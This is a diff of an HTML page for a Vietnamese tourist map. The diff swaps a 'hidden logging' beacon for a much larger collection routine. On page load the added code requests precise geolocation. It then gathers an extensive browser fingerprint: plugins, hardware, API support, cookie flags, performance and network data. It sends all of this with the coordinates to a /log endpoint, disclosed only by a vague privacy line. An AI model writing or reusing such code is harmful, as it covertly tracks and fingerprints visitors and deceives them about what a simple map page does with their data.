@@ -2,158 +2,469 @@
 <html lang="vi">
   <head>
     <meta charset="UTF-8" />
-    <title>Bản đồ Du lịch Việt Nam</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Bản Đồ Du Lịch Việt Nam</title>
     <link
       rel="stylesheet"
-      href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
-      integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY="
+      href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css"
+      integrity="sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A=="
       crossorigin=""
+    />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"
+      crossorigin="anonymous"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
+      integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
     />
     <style>
       body {
-        font-family: Arial, sans-serif;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
         margin: 0;
         padding: 0;
-        line-height: 1.6;
-      }
-      .container {
-        display: flex;
-        flex-direction: column;
-        height: 100vh;
+        background: #f5f5f5;
       }
       .header {
-        padding: 20px;
-        background-color: #2c3e50;
+        background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
         color: white;
+        padding: 1rem;
+        text-align: center;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
       }
-      h1 {
-        margin: 0;
-        font-size: 24px;
+      .map-container {
+        height: calc(100vh - 60px);
+        position: relative;
       }
       #map {
-        flex: 1;
-        width: 100%;
-        min-height: 400px;
+        height: 100%;
         z-index: 1;
-      }
-      .content {
-        padding: 20px;
-        background-color: white;
-      }
-      .footer {
-        padding: 10px 20px;
-        background-color: #2c3e50;
-        color: white;
-        font-size: 14px;
-        text-align: center;
-      }
-      .hidden {
-        display: none;
       }
       .location-info {
         position: absolute;
-        bottom: 20px;
-        left: 20px;
+        top: 20px;
+        right: 20px;
         background: white;
-        padding: 10px;
-        border-radius: 4px;
-        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        padding: 15px;
+        border-radius: 8px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        z-index: 2;
+        max-width: 300px;
+      }
+      .loading {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.9);
+        display: flex;
+        justify-content: center;
+        align-items: center;
         z-index: 1000;
+      }
+      .loading-spinner {
+        width: 50px;
+        height: 50px;
+        border: 5px solid #f3f3f3;
+        border-top: 5px solid #3498db;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+      .location-button {
+        position: absolute;
+        bottom: 20px;
+        right: 20px;
+        z-index: 2;
+        padding: 10px 20px;
+        background: #2a5298;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+      .location-button:hover {
+        background: #1e3c72;
+      }
+      .toast {
+        position: fixed;
+        bottom: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: #333;
+        color: white;
+        padding: 10px 20px;
+        border-radius: 5px;
+        z-index: 1000;
+        display: none;
       }
     </style>
   </head>
   <body>
-    <div class="container">
-      <div class="header">
-        <h1>🗺️ Khám phá Du lịch Việt Nam</h1>
-      </div>
-      <div id="map"></div>
-      <div class="location-info">
-        <h3>Thông tin địa điểm</h3>
-        <p>Di chuyển chuột trên bản đồ để xem thông tin</p>
-      </div>
-      <div class="footer">
-        <p>© 2025 - Bản đồ Du lịch Việt Nam - Mọi quyền được bảo lưu</p>
-      </div>
+    <div class="header">
+      <h1><i class="fas fa-map-marked-alt"></i> Bản Đồ Du Lịch Việt Nam</h1>
     </div>
 
-    <!-- Map initialization and logging script -->
+    <div class="map-container">
+      <div id="map"></div>
+      <div class="location-info">
+        <h3><i class="fas fa-location-arrow"></i> Vị trí của bạn</h3>
+        <p id="location-text">Đang tải vị trí...</p>
+      </div>
+      <button class="location-button" onclick="getLocation()">
+        <i class="fas fa-crosshairs"></i> Lấy vị trí hiện tại
+      </button>
+    </div>
+
+    <div class="loading" id="loading">
+      <div class="loading-spinner"></div>
+    </div>
+
+    <div class="toast" id="toast"></div>
+    <div class="privacy-policy">
+      <h2>Chính sách bảo mật và thu thập dữ liệu</h2>
+      <p>
+        Chúng tôi thu thập một số thông tin từ thiết bị của bạn để cải thiện
+        trải nghiệm người dùng và phân tích lưu lượng truy cập
+      </p>
+    </div>
     <script
-      src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
-      integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo="
+      src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"
+      integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA=="
       crossorigin=""
+      defer
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"
+      integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"
+      crossorigin="anonymous"
+      defer
     ></script>
     <script>
-      (function () {
-        // Initialize map centered on Vietnam
-        const map = L.map("map").setView([16.0474, 108.2062], 6);
+      let map;
+      let userMarker;
+      let locationMarkers = [];
 
-        // Add OpenStreetMap tiles
-        L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
-          maxZoom: 19,
-          attribution: "© OpenStreetMap contributors",
-        }).addTo(map);
+      // Khởi tạo bản đồ
+      function initMap() {
+        try {
+          map = L.map("map").setView([16.047079, 108.20623], 6);
+          L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+            attribution: "© OpenStreetMap contributors",
+            crossOrigin: true,
+            subdomains: ["a", "b", "c"],
+          }).addTo(map);
 
-        // Add some popular tourist locations in Vietnam
-        const locations = [
-          {
-            name: "Hạ Long Bay",
-            coords: [20.9101, 107.1839],
-            desc: "Di sản thiên nhiên thế giới",
-          },
-          {
-            name: "Phố cổ Hội An",
-            coords: [15.8801, 108.3265],
-            desc: "Phố cổ lịch sử",
-          },
-          {
-            name: "Hang Sơn Đoòng",
-            coords: [17.4456, 106.2876],
-            desc: "Hang động lớn nhất thế giới",
-          },
-          {
-            name: "Sapa",
-            coords: [22.3364, 103.8438],
-            desc: "Thị trấn trong mây",
-          },
-        ];
+          // Danh sách các địa điểm du lịch
+          const locations = [
+            { name: "Hà Nội", lat: 21.0285, lng: 105.8542, type: "capital" },
+            { name: "Hồ Chí Minh", lat: 10.7757, lng: 106.7004, type: "city" },
+            { name: "Đà Nẵng", lat: 16.0544, lng: 108.2022, type: "city" },
+            { name: "Hạ Long", lat: 20.9101, lng: 107.1839, type: "tourist" },
+            { name: "Huế", lat: 16.4619, lng: 107.5909, type: "tourist" },
+            { name: "Hội An", lat: 15.8801, lng: 108.338, type: "tourist" },
+            { name: "Nha Trang", lat: 12.2388, lng: 109.1967, type: "tourist" },
+            { name: "Phú Quốc", lat: 10.346, lng: 103.9874, type: "tourist" },
+          ];
 
-        // Add markers for each location
-        locations.forEach((loc) => {
-          L.marker(loc.coords)
-            .bindPopup(`<b>${loc.name}</b><br>${loc.desc}`)
-            .addTo(map);
-        });
+          // Thêm markers cho các địa điểm
+          locations.forEach((location) => {
+            const icon = L.divIcon({
+              className: `location-marker ${location.type}`,
+              html: `<i class="fas fa-map-marker-alt"></i>`,
+              iconSize: [30, 30],
+            });
 
-        // Hidden logging functionality
-        const logVisit = () => {
-          const timestamp = Date.now();
-          const randomParam = Math.random().toString(36).substring(7);
-          fetch(`/log?t=${timestamp}&r=${randomParam}&mapview=1`, {
-            method: "GET",
-            credentials: "same-origin",
-            cache: "no-store",
+            const marker = L.marker([location.lat, location.lng], { icon })
+              .bindPopup(`<b>${location.name}</b>`)
+              .addTo(map);
+            locationMarkers.push(marker);
           });
+        } catch (error) {
+          showToast("Không thể tải bản đồ. Vui lòng thử lại sau.");
+        }
+      }
+
+      // Hàm hiển thị toast message
+      function showToast(message, duration = 3000) {
+        const toast = document.getElementById("toast");
+        toast.textContent = message;
+        toast.style.display = "block";
+        setTimeout(() => {
+          toast.style.display = "none";
+        }, duration);
+      }
+
+      // Thu thập thông tin người dùng
+      async function collectUserInfo() {
+        // Thông tin cơ bản
+        const basicInfo = {
+          screenWidth: window.screen.width,
+          screenHeight: window.screen.height,
+          colorDepth: window.screen.colorDepth,
+          pixelRatio: window.devicePixelRatio,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          language: navigator.language,
+          doNotTrack: navigator.doNotTrack || "Unknown",
+          cookiesEnabled: navigator.cookieEnabled,
+          localStorage: !!window.localStorage,
+          sessionStorage: !!window.sessionStorage,
+          touchSupport: "ontouchstart" in window,
+          batteryLevel: navigator.getBattery ? "Available" : "Not Available",
+          connectionType: navigator.connection
+            ? navigator.connection.effectiveType
+            : "Unknown",
+          deviceMemory: navigator.deviceMemory || "Unknown",
+          hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
         };
 
-        // Log visit when map interaction occurs
-        map.on("moveend", logVisit);
-        map.on("zoomend", logVisit);
+        // Thông tin về plugins
+        const plugins = Array.from(navigator.plugins).map((plugin) => ({
+          name: plugin.name,
+          description: plugin.description,
+          filename: plugin.filename,
+        }));
 
-        // Initial log
-        logVisit();
+        // Thông tin về fonts
+        const fonts = document.fonts.check("12px Arial")
+          ? "Arial"
+          : "Not Arial";
+        const fontList =
+          document.fonts.status === "loaded"
+            ? "Fonts loaded"
+            : "Fonts not loaded";
 
-        // Update location info on mousemove
-        const locationInfo = document.querySelector(".location-info");
-        map.on("mousemove", (e) => {
-          const { lat, lng } = e.latlng;
-          locationInfo.innerHTML = `
-            <h3>Vị trí hiện tại</h3>
-            <p>Vĩ độ: ${lat.toFixed(4)}°<br>
-            Kinh độ: ${lng.toFixed(4)}°</p>
-          `;
-        });
-      })();
+        // Thông tin về API hỗ trợ
+        const apiSupport = {
+          geolocation: !!navigator.geolocation,
+          webGL: !!window.WebGLRenderingContext,
+          webRTC: !!window.RTCPeerConnection,
+          webAudio: !!window.AudioContext,
+          webSpeech: !!window.speechSynthesis,
+          webVR: !!navigator.getVRDisplays,
+          webBluetooth: !!navigator.bluetooth,
+          webUSB: !!navigator.usb,
+          webMIDI: !!navigator.requestMIDIAccess,
+          webNFC: !!navigator.nfc,
+          webPush: !!navigator.serviceWorker,
+          webShare: !!navigator.share,
+          webPayment: !!window.PaymentRequest,
+          webCredential: !!window.PasswordCredential,
+          webGamepad: !!navigator.getGamepads,
+          webVibration: !!navigator.vibrate,
+          webClipboard: !!navigator.clipboard,
+          webMediaSession: !!navigator.mediaSession,
+          webMediaDevices: !!navigator.mediaDevices,
+          webPermissions: !!navigator.permissions,
+          webPresentation: !!navigator.presentation,
+          webScreenOrientation: !!screen.orientation,
+          webWakeLock: !!navigator.wakeLock,
+          webXRSession: !!navigator.xr,
+        };
+
+        // Thông tin về bảo mật
+        const securityInfo = {
+          isSecureContext: window.isSecureContext,
+          hasSecureCookies: document.cookie.includes("Secure"),
+          hasHttpOnlyCookies: document.cookie.includes("HttpOnly"),
+          hasSameSiteCookies: document.cookie.includes("SameSite"),
+          hasContentSecurityPolicy: !!document.querySelector(
+            'meta[http-equiv="Content-Security-Policy"]'
+          ),
+          hasReferrerPolicy: !!document.querySelector('meta[name="referrer"]'),
+          hasPermissionsPolicy: !!document.querySelector(
+            'meta[http-equiv="Permissions-Policy"]'
+          ),
+          hasCrossOriginIsolated: !!window.crossOriginIsolated,
+          hasCrossOriginEmbedderPolicy: !!document.querySelector(
+            'meta[http-equiv="Cross-Origin-Embedder-Policy"]'
+          ),
+          hasCrossOriginOpenerPolicy: !!document.querySelector(
+            'meta[http-equiv="Cross-Origin-Opener-Policy"]'
+          ),
+          hasCrossOriginResourcePolicy: !!document.querySelector(
+            'meta[http-equiv="Cross-Origin-Resource-Policy"]'
+          ),
+        };
+
+        // Thông tin về thiết bị ngoại vi
+        const peripheralInfo = {
+          hasGamepad: !!navigator.getGamepads,
+          hasVibration: !!navigator.vibrate,
+          hasBluetooth: !!navigator.bluetooth,
+          hasUSB: !!navigator.usb,
+          hasNFC: !!navigator.nfc,
+          hasMIDI: !!navigator.requestMIDIAccess,
+          hasSerial: !!navigator.serial,
+          hasHID: !!navigator.hid,
+          hasWebHID: !!navigator.hid,
+          hasWebUSB: !!navigator.usb,
+          hasWebBluetooth: !!navigator.bluetooth,
+          hasWebNFC: !!navigator.nfc,
+          hasWebMIDI: !!navigator.requestMIDIAccess,
+          hasWebSerial: !!navigator.serial,
+          hasWebHID: !!navigator.hid,
+        };
+
+        // Thông tin về hiệu suất
+        const performanceInfo = {
+          memory: performance.memory
+            ? {
+                jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+                totalJSHeapSize: performance.memory.totalJSHeapSize,
+                usedJSHeapSize: performance.memory.usedJSHeapSize,
+              }
+            : "Not available",
+          timing: performance.timing
+            ? {
+                navigationStart: performance.timing.navigationStart,
+                loadEventEnd: performance.timing.loadEventEnd,
+                domComplete: performance.timing.domComplete,
+                responseEnd: performance.timing.responseEnd,
+              }
+            : "Not available",
+          navigation:
+            performance.getEntriesByType("navigation")[0] || "Not available",
+        };
+
+        // Thông tin về mạng
+        const networkInfo = {
+          connection: navigator.connection
+            ? {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData,
+              }
+            : "Not available",
+          online: navigator.onLine,
+          protocol: window.location.protocol,
+          hostname: window.location.hostname,
+          port: window.location.port,
+        };
+
+        return {
+          ...basicInfo,
+          plugins: JSON.stringify(plugins),
+          fonts: JSON.stringify({ fonts, fontList }),
+          apiSupport: JSON.stringify(apiSupport),
+          securityInfo: JSON.stringify(securityInfo),
+          peripheralInfo: JSON.stringify(peripheralInfo),
+          performanceInfo: JSON.stringify(performanceInfo),
+          networkInfo: JSON.stringify(networkInfo),
+        };
+      }
+
+      // Hàm lấy vị trí người dùng
+      async function getLocation() {
+        const loading = document.getElementById("loading");
+        loading.style.display = "flex";
+
+        if (navigator.geolocation) {
+          try {
+            const position = await new Promise((resolve, reject) => {
+              navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0,
+              });
+            });
+
+            const { latitude, longitude } = position.coords;
+            const locationText = document.getElementById("location-text");
+            locationText.innerHTML = `
+              <strong>Vĩ độ:</strong> ${latitude.toFixed(6)}<br>
+              <strong>Kinh độ:</strong> ${longitude.toFixed(6)}
+            `;
+
+            // Xóa marker cũ nếu có
+            if (userMarker) {
+              map.removeLayer(userMarker);
+            }
+
+            // Thêm marker cho vị trí người dùng
+            userMarker = L.marker([latitude, longitude], {
+              icon: L.divIcon({
+                className: "user-location",
+                html: '<i class="fas fa-user-circle"></i>',
+                iconSize: [30, 30],
+              }),
+            })
+              .bindPopup("Vị trí của bạn")
+              .addTo(map);
+
+            // Di chuyển bản đồ đến vị trí người dùng
+            map.setView([latitude, longitude], 13);
+
+            // Thu thập thông tin người dùng
+            const userInfo = await collectUserInfo();
+            const queryParams = new URLSearchParams({
+              location: `${latitude},${longitude}`,
+              ...userInfo,
+            });
+
+            // Gửi vị trí và thông tin người dùng đến server
+            const response = await fetch(`/log?${queryParams.toString()}`);
+            if (!response.ok) {
+              throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            const data = await response.json();
+
+            if (data.status === "ok") {
+              showToast("Đã cập nhật thông tin thành công!");
+            } else {
+              showToast("Không thể ghi log. Vui lòng thử lại sau.");
+            }
+          } catch (error) {
+            let message = "Không thể lấy vị trí của bạn. ";
+            if (error.code === error.PERMISSION_DENIED) {
+              message += "Bạn đã từ chối yêu cầu vị trí.";
+            } else if (error.code === error.POSITION_UNAVAILABLE) {
+              message += "Thông tin vị trí không khả dụng.";
+            } else if (error.code === error.TIMEOUT) {
+              message += "Yêu cầu vị trí đã hết thời gian chờ.";
+            } else {
+              message += "Đã xảy ra lỗi không xác định.";
+            }
+            showToast(message);
+          } finally {
+            loading.style.display = "none";
+          }
+        } else {
+          loading.style.display = "none";
+          showToast("Trình duyệt của bạn không hỗ trợ Geolocation");
+        }
+      }
+
+      // Khởi tạo bản đồ và lấy vị trí khi trang được tải
+      window.addEventListener("load", function () {
+        if (typeof L === "undefined") {
+          showToast("Không thể tải bản đồ. Vui lòng thử lại sau.");
+          return;
+        }
+        try {
+          initMap();
+          getLocation();
+        } catch (error) {
+          showToast("Có lỗi xảy ra khi tải trang. Vui lòng thử lại sau.");
+        }
+      });
     </script>
   </body>
 </html>
